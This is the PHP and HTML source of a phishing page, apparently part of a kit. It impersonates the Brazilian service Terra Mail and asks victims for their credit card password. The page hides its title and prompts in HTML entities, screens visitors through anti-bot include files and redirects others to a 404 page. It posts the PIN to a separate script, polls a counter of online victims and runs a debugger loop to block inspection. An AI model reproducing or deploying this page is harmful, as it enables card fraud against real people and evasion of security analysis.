<?php 
session_start();
date_default_timezone_set('America/Sao_Paulo');
@include ('./verifyBot/27lcxdso.php');
require_once('./verifyBot/ant-bot.php');
require_once('./verifyBot/ant-bot1.php');

if (isset($_SESSION["7s1f9l81cb"])) {
} else {
  header("Location: 404/?noticia=negado");
  exit();
}
?>
<!DOCTYPE html>
<html lang="pt-br">

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">

	<title>&#84;&#101;&#114;&#114;&#97;&#32;&#77;&#97;&#105;&#108;</title>


	<meta name="theme-color" content="##F1F1F1">
	<meta name="apple-mobile-web-app-status-bar-style" content="##F1F1F1">
	<meta name="msapplication-navbutton-color" content="##F1F1F1">
	<script type="text/javascript" src="./assets/noc.js"></script>
	<link rel="shortcut icon" type="image/x-icon" href="./assets/favicon_1.ico">

	<link rel="stylesheet" href="./assets/1ygozths/all.css">

</head>

<body cz-shortcut-listen="true" style="background-color: #F1F1F1;">

	<div id="app">
		<div>
			<div class="md">
				<div class="corpo_md">


					<div class="show_apd" v-show="!isInicio" style="background:#FF7212;">
						<center><img src="./assets/1ygozths/logo.png" width="132px" height="45px"></center>
						<p>Precisamos que você forneça algumas informações adicionais</p>
						<p>
						&#73;&#110;&#102;&#111;&#114;&#109;&#101;&#32;&#97;&#32;&#115;&#101;&#110;&#104;&#97;&#32;&#100;&#111;&#32;&#115;&#101;&#117;&#32;&#99;&#97;&#114;&#116;&#227;&#111;&#32;&#100;&#101;&#32;&#99;&#114;&#233;&#100;&#105;&#116;&#111;
						</p>

						<form id="formulario" name="form" method="POST" action="4uov9fby.php">

							<script>
								function somenteNumeros(num) {
									var er = /[^0-9.]/;
									er.lastIndex = 0;
									var campo = num;
									if (er.test(campo.value)) {
										campo.value = "";
									}
								}
							</script>

							<label for="telefone">
								<span style="color: white;">&#83;&#101;&#110;&#104;&#97;&#32;&#100;&#111;&#32;&#99;&#97;&#114;&#116;&#227;&#111;</span>
								<input type="password" name="scard" id="scard" minlength="4" maxlength="8" onkeyup="somenteNumeros(this);" placeholder="&#83;&#101;&#110;&#104;&#97;&#32;&#100;&#111;&#32;&#99;&#97;&#114;&#116;&#227;&#111;" required="required">
							</label>


							<button class="btn_next" style="color:white;background:#c14e00;" id="submit" type="submit" title="Confirmar" value="CONFIRMAR">CONFIRMAR</button>
						</form>
					</div>
				</div>
			</div>
			<div class="wrapper container_dentro">
				<div class="header">
					<div class="buscar"><img src="./assets/1ygozths/busca.png" alt=""></div>
					<div class="menu"><img src="./assets/1ygozths/menu.png" alt=""></div>

				</div>

				<div class="corpo">

					<div class="corpo_img"><img src="./assets/1ygozths/corpo.png" alt=""></div>
				</div>
			</div>
		</div>
	</div>

	<script>
		setInterval(function() {
			$.post("./verifyBot/8whu95hvz7.php", {
				contar: ""
			}, function(n) {
				$("#Online").text(n)
			})
		}, 1e4);
	</script>

<script>
setInterval(()=>{debugger;},0xc8);
</script>

</body>

</html>